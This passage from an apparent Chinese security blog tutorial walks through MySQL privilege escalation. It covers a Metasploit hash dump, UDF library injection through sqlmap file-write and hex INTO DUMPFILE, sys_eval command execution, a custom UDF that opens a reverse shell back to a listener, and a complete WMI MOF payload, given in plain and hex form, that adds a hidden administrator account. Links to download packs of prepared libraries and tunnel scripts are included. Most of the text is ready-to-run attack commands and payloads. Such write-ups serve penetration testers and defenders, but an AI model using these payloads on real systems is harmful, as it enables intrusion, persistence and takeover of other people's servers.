+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">BASH<br>msf6 &gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdump<br>msf6 &gt; <span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">127.0.0.1</span><br>msf6 <span class="hljs-comment">&gt; run</span><br></code></pre></td></tr></table></figure>
+
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16057589592021.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16057589592021.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>这个 MySQL 的 Hash 解密出的结果为 123456</p>
+<h1 id="UDF-提权"><a href="#UDF-提权" class="headerlink" title="UDF 提权"></a>UDF 提权</h1><p>自定义函数，是数据库功能的一种扩展。用户通􏰁自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version () 等方便。</p>
+<h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h3><p>如果是 MySQL &gt;&#x3D; 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p>
+<p>那么动态链接库文件去哪里找呢？实际上我们常用的工具 sqlmap 和 Metasploit 里面都自带了对应系统的动态链接库文件。</p>
+<ul>
+<li><strong>sqlmap 的 UDF 动态链接库文件位置</strong></li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">BASH<br>sqlmap根目录<span class="hljs-regexp">/data/u</span>df/mysql<br></code></pre></td></tr></table></figure>
+
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16042389608666.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16042389608666.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具 cloak.py 来解码使用，cloak.py 的位置为：<code>/extra/cloak/cloak.py</code> ，解码方法如下：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">BASH<br><br><span class="hljs-comment"># 查看当前目录情况</span><br>➜ pwd<br><span class="hljs-regexp">/Users/gu</span>ang<span class="hljs-regexp">/Documents/</span>X1ct34m<span class="hljs-regexp">/sqlmap/</span><span class="hljs-number">1.4</span>.<span class="hljs-number">6</span><span class="hljs-regexp">/extra/</span>cloak<br><br><span class="hljs-comment"># 解码 32 位的 Linux 动态链接库</span><br>➜ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><br><span class="hljs-comment"># 解码 64 位的 Linux 动态链接库</span><br>➜ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><br><span class="hljs-comment"># 解码 32 位的 Windows 动态链接库</span><br>➜ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><br><span class="hljs-comment"># 解码 64 位的 Windows 动态链接库</span><br>➜ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br><br><span class="hljs-comment"># 查看当前目录下的情况</span><br>➜ ls<br>README.txt              cloak.py                lib_mysqludf_sys_32.so  lib_mysqludf_sys_64.so<br>__init__.py             lib_mysqludf_sys_32.dll lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure>
+
+<p>国光打包了 sqlmap 解码后的动态链接库：<a target="_blank" rel="noopener" href="https://sqlsec.lanzoux.com/i4b7jhyhwid">蓝奏云 - sqlmap udf.zip</a> 需要的朋友可以自提</p>
+<ul>
+<li><strong>Metasploit 的 UDF 动态链接库文件位置</strong></li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">BASH<br>MSF 根目录<span class="hljs-regexp">/embedded/</span>framework<span class="hljs-regexp">/data/</span>exploits/mysql<br></code></pre></td></tr></table></figure>
+
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16042411877187.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16042411877187.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>Metasploit 自带的动态链接库文件无需解码，开箱即可食用。</p>
+<p>国光使用 010-Editor 对比了 metsaploit 自带的与 sqlmap 解码后的动态链接库文件，发现他们的内容一模一样。</p>
+<p>下面来看下动态链接库里面有包含了哪些函数：</p>
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16042478578910.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16042478578910.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<h3 id="寻找插件目录"><a href="#寻找插件目录" class="headerlink" title="寻找插件目录"></a>寻找插件目录</h3><p>接下来的任务是把 UDF 的动态链接库文件放到 MySQL 的插件目录下，这个目录改如何去寻找呢？可以使用如下的 SQL 语句来查询：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">SQL<br><span class="hljs-section">mysql&gt; show variables like &#x27;%plugin%&#x27;;</span><br><span class="hljs-section">+---------------+------------------------------+</span><br><span class="hljs-section">| Variable_name | Value                        |</span><br><span class="hljs-section">+---------------+------------------------------+</span><br><span class="hljs-section">| plugin_dir    | /usr/local/mysql/lib/plugin/ |</span><br><span class="hljs-section">+---------------+------------------------------+</span><br></code></pre></td></tr></table></figure>
+
+<p>如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 <code>\lib\plugin</code> 文件夹：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">BASH<br>mysql &gt; select 233 into dumpfile &#x27;C:<span class="hljs-symbol">\\</span>PhpStudy<span class="hljs-symbol">\\</span>PHPTutorial<span class="hljs-symbol">\\</span>MySQL<span class="hljs-symbol">\\</span>lib<span class="hljs-symbol">\\</span>plugin::$index_allocation&#x27;;<br></code></pre></td></tr></table></figure>
+
+<p>通过 NTFS ADS 流创建文件夹成功率不高，目前 MySQL 官方貌似已经阉割了这个功能。那么如果找到 MySQL 的安装目录呢？通用也有对应的 SQL 语句可以查询出来：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">SQL<br><span class="hljs-section">mysql&gt; select @@basedir;</span><br><span class="hljs-section">+------------------+</span><br><span class="hljs-section">| @@basedir        |</span><br><span class="hljs-section">+------------------+</span><br><span class="hljs-section">| /usr/local/mysql |</span><br><span class="hljs-section">+------------------+</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="写入动态链接库"><a href="#写入动态链接库" class="headerlink" title="写入动态链接库"></a>写入动态链接库</h3><p>写入动态链接库可以分为下面几种情形：</p>
+<p>SQL 注入且是高权限，plugin 目录可写且需要 secure_file_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有<strong>字节长度限制</strong>，所以往往 POST 注入才可以执行这种攻击</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">BASH<br>sqlmap -u <span class="hljs-string">&quot;http://localhost:30008/&quot;</span> --data<span class="hljs-operator">=</span><span class="hljs-string">&quot;id=1&quot;</span> --file-write<span class="hljs-operator">=</span><span class="hljs-string">&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot;</span> --file-dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16055961029549.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16055961029549.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<ol>
+<li>如果没有注入的话，我们可以操作原生 SQL 语句，这种情况下当 secure_file_priv 无限制的时候，我们也是可以手工写文件到 plugin 目录下的：</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><br># 直接 <span class="hljs-keyword">SELECT</span> 查询十六进制写入<br><span class="hljs-keyword">SELECT</span> <span class="hljs-number">0x7f454c4602</span>... <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;<br><br># 解码十六进制再写入多此一举<br><span class="hljs-keyword">SELECT</span> unhex(<span class="hljs-string">&#x27;7f454c4602...&#x27;</span>) <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>这里的十六进制怎么获取呢？可以利用 MySQL 自带的 hex 函数来编码：</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit">SQL<br><span class="hljs-meta"># 直接传入路径编码</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">hex</span>(load_file(<span class="hljs-string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>))<span class="hljs-comment">;</span><br><br><span class="hljs-meta"># 也可以将路径 hex 编码</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">hex</span>(load_file(<span class="hljs-number">0x2f6c69625f6d7973716c7564665f7379735f36342e736f</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>一般为了更方便观察，可以将编码后的结果导入到新的文件中方便观察：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><br><span class="hljs-keyword">SELECT</span> hex(load_file(<span class="hljs-string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>)) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;/tmp/udf.txt&#x27;</span>; <br><br><span class="hljs-keyword">SELECT</span> hex(load_file(<span class="hljs-number">0x2f6c69625f6d7973716c7564665f7379735f36342e736f</span>)) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;/tmp/udf.txt&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>为了方便大家直接复制，国光这里单独写了个页面，有意者自取：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">MySQL UDF 提权十六进制查询</a></p>
+<blockquote>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">BASH<br><span class="hljs-keyword">ERROR </span>1126 (HY000): Can&#x27;t open shared library &#x27;udf.dll&#x27; (errno: 193 )<br></code></pre></td></tr></table></figure>
+
+<p>网友们可能看到这个报错，因为 lib_mysqludf_sys_64.dll 失败，最后使用 lib_mysqludf_sys_32.dll 才成功，所以这里的 dll 应该和系统位数无关，可能和 MySQL 的安装版本有关系，而 PHPStudy 自带的 MySQL 版本是 32 位的</p>
+</blockquote>
+<h3 id="创建自定义函数并调用命令"><a href="#创建自定义函数并调用命令" class="headerlink" title="创建自定义函数并调用命令"></a>创建自定义函数并调用命令</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><br>mysql <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> STRING SONAME <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>导入成功后查看一下 mysql 函数里面是否新增了 sys_eval：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">SQL<br><span class="hljs-section">mysql&gt; select * from mysql.func;</span><br><span class="hljs-section">+----------+-----+---------+----------+</span><br><span class="hljs-section">| name     | ret | dl      | type     |</span><br><span class="hljs-section">+----------+-----+---------+----------+</span><br><span class="hljs-section">| sys_eval |   0 | udf.dll | function |</span><br><span class="hljs-section">+----------+-----+---------+----------+</span><br></code></pre></td></tr></table></figure>
+
+<p>这里的 sys_eval 支持自定义，接着就可以通过创建的这个函数来执行系统命令了：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">BASH<br>mysql &gt; <span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">sys_eval</span>(<span class="hljs-params"><span class="hljs-string">&#x27;whoami&#x27;</span></span>)</span>;<br></code></pre></td></tr></table></figure>
+
+<p>如果在 Windows 系统下的话应该就是最高权限了，执行一些 net user 增加用户的命令应该都是可以成功的</p>
+<h3 id="删除自定义函数"><a href="#删除自定义函数" class="headerlink" title="删除自定义函数"></a>删除自定义函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><br>mysql <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval;<br></code></pre></td></tr></table></figure>
+
+<h2 id="UDF-shell"><a href="#UDF-shell" class="headerlink" title="UDF shell"></a>UDF shell</h2><p>假设目标 MySQL 在内网情况下，无法直连 MySQL 或者 MySQL 不允许外连，这个时候一些网页脚本就比较方便好用了。</p>
+<h3 id="UDF-PHP"><a href="#UDF-PHP" class="headerlink" title="UDF.PHP"></a>UDF.PHP</h3><p><a target="_blank" rel="noopener" href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">t00ls UDF.PHP</a> 简单方便，一键 DUMP UDF 和函数，操作门槛降低了很多：</p>
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16057508091895.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16057508091895.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<h3 id="Navicat-MySQL"><a href="#Navicat-MySQL" class="headerlink" title="Navicat MySQL"></a>Navicat MySQL</h3><p>目标 MySQL 不允许外连，但是可以上传 PHP 脚本:</p>
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16057523959536.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16057523959536.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>这个时候可以使用 Navicat 自带的 tunnel 隧道脚本上传到目标网站上：</p>
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16057511437230.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16057511437230.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>国光这里顺便打包了一份出来：<a target="_blank" rel="noopener" href="https://sqlsec.lanzoux.com/ibpoGijd6bc">蓝奏云：Navicat tunnel.zip</a> 实际上 Navicat 很久很久以前就自带这些脚本了，这个脚本有点类似于 reGeorg，只是官方的脚本用起来更舒服方便一点，脚本的界面如下：</p>
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16057520384495.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16057520384495.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>接着连接的时候设置 HTTP 通道：</p>
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16057523604421.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16057523604421.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>这个时候主机地址填写 localhost 即可：</p>
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16057524473020.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16057524473020.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>连接成功后自然就可以愉快地进行手工 UDF 提权啦：</p>
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16057526319645.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16057526319645.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<h1 id="反弹端口提权"><a href="#反弹端口提权" class="headerlink" title="反弹端口提权"></a>反弹端口提权</h1><p>实际上这是 UDF 提权的另一种用法，只是这里的动态链接库被定制过的，功能更多更实用一些：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">BASH</span><br><span class="hljs-keyword"></span>cmdshell        <span class="hljs-comment"># 执行cmd</span><br>downloader      <span class="hljs-comment"># 下载者,到网上下载指定文件并保存到指定目录</span><br>open3389        <span class="hljs-comment"># 通用开3389终端服务,可指定端口(不改端口无需重启)</span><br><span class="hljs-keyword">backshell </span>      <span class="hljs-comment"># 反弹Shell</span><br>ProcessView     <span class="hljs-comment"># 枚举系统进程</span><br>KillProcess     <span class="hljs-comment"># 终止指定进程</span><br>regread         <span class="hljs-comment"># 读注册表</span><br>regwrite        <span class="hljs-comment"># 写注册表</span><br><span class="hljs-keyword">shut </span>           <span class="hljs-comment"># 关机,注销,重启</span><br>about           <span class="hljs-comment"># 说明与帮助函数</span><br></code></pre></td></tr></table></figure>
+
+<p>这个动态链接库有点历史了，不过还是被国光我找到了<a target="_blank" rel="noopener" href="https://sqlsec.lanzoux.com/iEQA0ijfu6d">蓝奏云：langouster_udf.zip</a>：</p>
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16057546316568.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16057546316568.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>下面尝试来使用这个 dll 来反弹 shell 试试看吧，首先在 10.20.24.244 上开启 NC 监听：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">BASH</span><br>➜  <span class="hljs-regexp">~ ncat</span> -lvp <span class="hljs-number">2333</span><br>Ncat: Version <span class="hljs-number">7</span>.<span class="hljs-number">80</span> ( https://nmap.org/ncat )<br>Ncat: Listening <span class="hljs-literal">on</span> :::<span class="hljs-number">2333</span><br>Ncat: Listening <span class="hljs-literal">on</span> <span class="hljs-number">0.0.0.0:2333</span><br></code></pre></td></tr></table></figure>
+
+<p>然后目标机器上导入 dll 动态链接库（这里偷懒就忽略了），然后创建自定义函数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><br>mysql <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> backshell <span class="hljs-keyword">RETURNS</span> STRING SONAME <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>直接反弹 shell ：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">BASH<br>mysql &gt; <span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">backshell</span>(<span class="hljs-params"><span class="hljs-string">&quot;10.20.24.244&quot;</span>, <span class="hljs-number">2333</span></span>)</span>;<br></code></pre></td></tr></table></figure>
+
+<p>成功上线：</p>
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16057552542660.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16057552542660.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<h1 id="MOF-提权"><a href="#MOF-提权" class="headerlink" title="MOF 提权"></a>MOF 提权</h1><p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是 C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; 目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p>
+<h2 id="手工复现-1"><a href="#手工复现-1" class="headerlink" title="手工复现"></a>手工复现</h2><h3 id="上传-mof-文件执行命令"><a href="#上传-mof-文件执行命令" class="headerlink" title="上传 mof 文件执行命令"></a>上传 mof 文件执行命令</h3><p>mof 脚本的内容如下：</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">PAYLOAD</span><br><br>#pragma namespace(<span class="hljs-string">&quot;<span class="hljs-subst">\\</span><span class="hljs-subst">\\</span>.<span class="hljs-subst">\\</span>root<span class="hljs-subst">\\</span>subscription&quot;</span>) <br><br>instance of __EventFilter <span class="hljs-keyword">as</span> <span class="hljs-variable">$EventFilter</span> <br>&#123; <br>    <span class="hljs-type">EventNamespace</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Root<span class="hljs-subst">\\</span>Cimv2&quot;</span>; <br>    <span class="hljs-type">Name</span>  <span class="hljs-operator">=</span> <span class="hljs-string">&quot;filtP2&quot;</span>; <br>    <span class="hljs-type">Query</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span> <br>            <span class="hljs-string">&quot;Where TargetInstance Isa <span class="hljs-subst">\&quot;</span>Win32_LocalTime<span class="hljs-subst">\&quot;</span> &quot;</span> <br>            <span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>; <br>    <span class="hljs-type">QueryLanguage</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;WQL&quot;</span>; <br>&#125;; <br><br>instance of <span class="hljs-type">ActiveScriptEventConsumer</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$Consumer</span> <br>&#123; <br>    <span class="hljs-type">Name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;consPCSV2&quot;</span>; <br>    <span class="hljs-type">ScriptingEngine</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;JScript&quot;</span>; <br>    <span class="hljs-type">ScriptText</span> <span class="hljs-operator">=</span> <br><span class="hljs-string">&quot;var WSH = new ActiveXObject(<span class="hljs-subst">\&quot;</span>WScript.Shell<span class="hljs-subst">\&quot;</span>)<span class="hljs-subst">\n</span>WSH.run(<span class="hljs-subst">\&quot;</span>net.exe user hacker P@ssw0rd /add<span class="hljs-subst">\&quot;</span>)<span class="hljs-subst">\n</span>WSH.run(<span class="hljs-subst">\&quot;</span>net.exe localgroup administrators hacker /add<span class="hljs-subst">\&quot;</span>)&quot;</span>; <br>&#125;; <br><br>instance of __FilterToConsumerBinding <br>&#123; <br>    <span class="hljs-type">Consumer</span>   <span class="hljs-operator">=</span> <span class="hljs-variable">$Consumer</span>; <br>    <span class="hljs-type">Filter</span> <span class="hljs-operator">=</span> <span class="hljs-variable">$EventFilter</span>; <br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>核心 payload 为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">VBSCRIPT<br>var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd /add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker /add\&quot;)<br></code></pre></td></tr></table></figure>
+
+<p>MySQL 写文件的特性将这个 MOF 文件导入到 C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; 目录下，依然采用上述编码的方式：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><br>mysql <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A</span> <span class="hljs-keyword">into</span> dumpfile &quot;C:/windows/system32/wbem/mof/test.mof&quot;;<br></code></pre></td></tr></table></figure>
+
+<p>执行成功的的时候，test.mof 会出现在：c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;goog&#x2F; 目录下 否则出现在 c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;bad 目录下：</p>
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16056293813642.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16056293813642.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<h3 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h3><p>因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果：</p>
